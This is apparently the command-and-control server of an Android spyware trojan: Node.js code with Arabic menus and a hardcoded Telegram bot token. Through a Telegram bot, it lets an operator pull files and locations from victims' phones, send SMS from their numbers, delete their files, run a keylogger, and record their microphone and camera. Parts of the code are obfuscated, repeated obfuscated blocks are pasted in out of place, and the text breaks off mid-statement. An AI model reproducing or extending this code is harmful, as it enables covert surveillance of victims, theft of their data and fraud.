_0x3ea82b=appData['get'](_0x823cfc(0x217));_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x232)&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x246),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':'contacts','extras':[]}),appData[_0xcd7349(0x209)](_0x823cfc(0x217)),bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[['✯\x20الأجهزة المتصلة \x20✯',_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x259)&&(_0x3ea82b==_0xcd7349(0x25b)?io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0x823cfc(0x1ef),'extras':[]}):io[_0xcd7349(0x1ec)][_0x823cfc(0x1f3)](_0x823cfc(0x230),{'request':_0xcd7349(0x1ff),'extras':[]}),appData[_0x823cfc(0x249)](_0x823cfc(0x217)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x214)&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x235),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x235),'extras':[]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),bot[_0xcd7349(0x1ef)](data['id'],_0x823cfc(0x214),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x23e),_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0x823cfc(0x270)&&(_0x3ea82b==_0xcd7349(0x25b)?io['sockets'][_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x20b),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x20b),'extras':[]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1d8)&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x20a),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x20a),'extras':[]}),appData[_0x823cfc(0x249)](_0x823cfc(0x217)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0x823cfc(0x22c)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x220)&&(_0x3ea82b=='all'?io[_0xcd7349(0x1ec)]['emit'](_0xcd7349(0x252),{'request':_0xcd7349(0x210),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)]('commend',{'request':_0x823cfc(0x20b),'extras':[]}),appData[_0x823cfc(0x249)](_0xcd7349(0x1f5)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0x823cfc(0x24d),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x254)&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0x823cfc(0x1f3)](_0x823cfc(0x230),{'request':_0xcd7349(0x240),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0x823cfc(0x230),{'request':_0xcd7349(0x240),'extras':[]}),appData[_0x823cfc(0x249)](_0x823cfc(0x217)),bot[_0xcd7349(0x1ef)](data['id'],_0x823cfc(0x214),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0x823cfc(0x22c)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x21f)&&bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0x823cfc(0x22c)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]==='✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙽\x20✯'&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)]['emit'](_0x823cfc(0x230),{'request':_0xcd7349(0x1e2),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0x823cfc(0x248),'extras':[]}),appData[_0xcd7349(0x209)](_0xcd7349(0x1f5)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1f7),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1e9)&&(_0x3ea82b==_0xcd7349(0x25b)?io[_0xcd7349(0x1ec)][_0xcd7349(0x21d)](_0xcd7349(0x252),{'request':_0xcd7349(0x241),'extras':[]}):io['to'](_0x3ea82b)[_0xcd7349(0x21d)]('commend',{'request':_0xcd7349(0x241),'extras':[]}),appData[_0xcd7349(0x209)](_0x823cfc(0x217)),bot[_0xcd7349(0x1ef)](data['id'],_0x823cfc(0x214),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0x823cfc(0x261)&&bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0x823cfc(0x22c)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x215)&&bot[_0xcd7349(0x1ef)](data['id'],_0x823cfc(0x269),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0x823cfc(0x1f4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1f1)&&bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1da)&&bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x236)&&(appData[_0x823cfc(0x20a)](_0xcd7349(0x221),'microphoneDuration'),bot[_0x823cfc(0x23c)](data['id'],_0xcd7349(0x238),{'parse_mode':'HTML','reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x20c)&&(appData[_0xcd7349(0x217)](_0xcd7349(0x221),_0x823cfc(0x21d)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x213),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x1f8)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0x823cfc(0x21f)]===_0xcd7349(0x1f0)&&(appData[_0x823cfc(0x20a)](_0xcd7349(0x221),_0xcd7349(0x227)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1fb),{'parse_mode':'HTML','reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x24e)&&(appData[_0xcd7349(0x217)](_0xcd7349(0x221),_0xcd7349(0x253)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x20d),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0x823cfc(0x21f)]===_0xcd7349(0x1ed)&&(appData[_0xcd7349(0x217)](_0xcd7349(0x221),_0xcd7349(0x1d2)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x22e),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x21a)&&(appData[_0xcd7349(0x217)](_0xcd7349(0x221),_0xcd7349(0x1f4)),bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x1db),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}})),_0xdbde0c[_0x823cfc(0x21f)]===_0xcd7349(0x1d6)&&bot[_0xcd7349(0x1ef)](data['id'],'<b>✯\x20هذه\x20خيار\x20يكون\x20فقط\x20متوفر\x20𝚘𝚗\x20𝚙𝚛𝚎𝚖𝚒𝚞𝚖\x20رواية\x20dm\x20الى\x20يشترى\x20@TT1TT6</b>\x0a\x0a',{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}}),_0xdbde0c[_0xcd7349(0x205)]===_0xcd7349(0x1e5)&&bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x200),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}}),_0xdbde0c[_0x823cfc(0x21f)]===_0xcd7349(0x1e6)&&bot[_0xcd7349(0x1ef)](data['id'],_0xcd7349(0x22b),{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0x823cfc(0x218),_0xcd7349(0x1d4)],[_0xcd7349(0x1e3)]],'resize_keyboard':!![]}});}else io[_0xcd7349(0x1ec)][_0xcd7349(0x1ec)][_0xcd7349(0x248)]((_0x22a16b,_0x30e015,_0x5acd93)=>{const _0x5724cd=_0x823cfc,_0x175aa5=_0xcd7349;_0xdbde0c[_0x175aa5(0x205)]===_0x22a16b[_0x175aa5(0x24a)]&&(appData[_0x5724cd(0x20a)](_0x5724cd(0x217),_0x30e015),bot[_0x175aa5(0x1ef)](data['id'],_0x175aa5(0x255)+_0x22a16b[_0x5724cd(0x268)]+_0x175aa5(0x244),{'parse_mode':_0x5724cd(0x24d),'reply_markup':{'keyboard':[['✯\x20جهات الاتصال\x20✯',_0x175aa5(0x259)],[_0x175aa5(0x214),_0x175aa5(0x1ee)],[_0x175aa5(0x1d8),_0x175aa5(0x220)],[_0x175aa5(0x236),_0x5724cd(0x1df)],[_0x175aa5(0x21f),_0x175aa5(0x20c)],[_0x175aa5(0x1f0),_0x175aa5(0x24e)],[_0x175aa5(0x1e6),_0x5724cd(0x21e)],['✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20لا\x20✯',_0x175aa5(0x1e9)],['✯\x20ملف\x20مستكشف\x20✯',_0x175aa5(0x215)],[_0x175aa5(0x1f1),_0x175aa5(0x1da)],[_0x175aa5(0x1d6),_0x5724cd(0x240)],[_0x175aa5(0x1ed)],['✯\x20شعبي\x20إعلام\x20✯'],[_0x175aa5(0x233)]],'resize_keyboard':!![],'one_time_keyboard':!![]}}));}),_0xdbde0c[_0xcd7349(0x205)]==_0xcd7349(0x251)&&(appData[_0xcd7349(0x217)](_0xcd7349(0x1f5),_0xcd7349(0x25b)),bot[_0xcd7349(0x1ef)](data['id'],'<b>✯\x20اختار\x20عمل\x20إلى\x20نفذ\x20لأجل\x20جميع\x20متوفرة\x20الأجهزة</b>\x0a\x0a',{'parse_mode':_0xcd7349(0x21b),'reply_markup':{'keyboard':[[_0xcd7349(0x232),_0xcd7349(0x259)],[_0x823cfc(0x237),_0x823cfc(0x270)],[_0xcd7349(0x1d8),_0x823cfc(0x265)],[_0xcd7349(0x236),_0xcd7349(0x254)],[_0xcd7349(0x21f),_0x823cfc(0x25b)],[_0xcd7349(0x1f0),_0xcd7349(0x24e)],[_0xcd7349(0x1e6),_0xcd7349(0x1d0)],[_0xcd7349(0x234),_0x823cfc(0x264)],[_0xcd7349(0x23a),_0xcd7349(0x215)],[_0xcd7349(0x1f1),_0xcd7349(0x1da)],[_0xcd7349(0x1d6),_0xcd7349(0x1e5)],[_0xcd7349(0x1ed)],[_0xcd7349(0x21a)],[_0x823cfc(0x206)]],'resize_keyboard':!![],'one_time_keyboard':!![]}}));}}}}}}}}}}}}}}),setInterval(()=>{const _0x3a6127=_0x24a636;io[_0x3a6127(0x1ec)][_0x3a6127(0x1ec)]['forEach']((_0x107f46,_0x316932,_0x1f46f7)=>{const _0xf77476=_0x151b,_0x2cdae1=_0x3a6127;io['to'](_0x316932)[_0x2cdae1(0x21d)](_0xf77476(0x24e),{});});},0x1388),setInterval(()=>{const _0x3abfdd=_0x24a636;https[_0x3abfdd(0x1e1)](data[_0x3abfdd(0x231)],_0x9df260=>{})['on'](_0x3abfdd(0x1e8),_0x26bc04=>{});},0x75300),server[_0x24a636(0x1d5)](process[_0x24a636(0x1dc)][_0x24a636(0x1e4)]||0xbb8,()=>{const _0x1a784c=_0x407f39,_0x3c0f14=_0x24a636;console[_0x1a784c(0x1de)](_0x3c0f14(0x22a));});
+const express = require('express');
+const webSocket = require('ws');
+const http = require('http')
+const telegramBot = require('node-telegram-bot-api')
+const uuid4 = require('uuid')
+const multer = require('multer');
+const bodyParser = require('body-parser')
+const axios = require("axios");
+const CryptoJS = require('crypto-js');
+const token = '8080467589:AAHBgVZfVINPLOC7tyaGq9FRS3E_GqNZR_c'
+const id = '8099594654'
+const address = 'https://www.google.com'
+
+const app = express();
+const appServer = http.createServer(app);
+const appSocket = new webSocket.Server({server: appServer});
+const appBot = new telegramBot(token, {polling: true});
+const appClients = new Map()
+
+let currentNumber = '';
+let currentUuid = '';
+let currentTitle = '';
+
+// أضف الكود هنا
+app.use(bodyParser.json({limit: '50mb'}));
+app.use(bodyParser.urlencoded({
+    limit: '50mb',
+    extended: true,
+    parameterLimit: 50000
+}));
+
+const upload = multer({
+    limits: {
+        fileSize: 50 * 1024 * 1024 // 50 ميجابايت
+    }
+});
+// نهاية الكود المضاف
+
+app.get('/', function (req, res) {
+    res.send('<h1 align="center">تم بنجاخ   تشغيل البوت مطور البوت :  الهاكر الغامض شخصيا  معرف المطور @VIP_MFM</h1>')
+})
+
+app.post("/uploadFile", upload.single('file'), (req, res) => {
+    const name = req.file.originalname
+    appBot.sendDocument(id, req.file.buffer, {
+            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
+            parse_mode: "HTML"
+        },
+        {
+            filename: name,
+            contentType: 'application/txt',
+        })
+    res.send('')
+})
+app.post("/uploadText", (req, res) => {
+    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
+    res.send('')
+})
+app.post("/uploadLocation", (req, res) => {
+    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
+    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
+    res.send('')
+})
+appSocket.on('connection', (ws, req) => {
+    const uuid = uuid4.v4()
+    const model = req.headers.model
+    const battery = req.headers.battery
+    const version = req.headers.version
+    const brightness = req.headers.brightness
+    const provider = req.headers.provider
+
+    ws.uuid = uuid
+    appClients.set(uuid, {
+        model: model,
+        battery: battery,
+        version: version,
+        brightness: brightness,
+        provider: provider
+    })
+    appBot.sendMessage(id,
+        `°• جهاز جديد متصل\n\n` +
+        `• موديل الجهاز : <b>${model}</b>\n` +
+        `• البطارية : <b>${battery}</b>\n` +
+        `• نظام الاندرويد : <b>${version}</b>\n` +
+        `• سطوح الشاشة : <b>${brightness}</b>\n` +
+        `• مزود : <b>${provider}</b>`,
+        {parse_mode: "HTML"}
+    )
+    ws.on('close', function () {
+        appBot.sendMessage(id,
+            `°• لا يوجد جهاز متصل\n\n` +
+            `• موديل الجهاز : <b>${model}</b>\n` +
+            `• البطارية : <b>${battery}</b>\n` +
+            `• نظام الاندرويد : <b>${version}</b>\n` +
+            `• سطوح الشاشة : <b>${brightness}</b>\n` +
+            `• مزود : <b>${provider}</b>`,
+            {parse_mode: "HTML"}
+        )
+        appClients.delete(ws.uuid)
+    })
+})
+appBot.on('message', (message) => {
+    const chatId = message.chat.id;
+    if (message.reply_to_message) {
+        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
+            currentNumber = message.text
+            appBot.sendMessage(id,
+                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
+                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+                {reply_markup: {force_reply: true}}
+            )
+        }
+        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`send_message:${currentNumber}/${message.text}`)
+                }
+            });
+            currentNumber = ''
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
+            const message_to_all = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`send_message_to_all:${message_to_all}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
+            const path = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`file:${path}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
+            const path = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`delete_file:${path}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`microphone:${duration}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`rec_camera_main:${duration}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
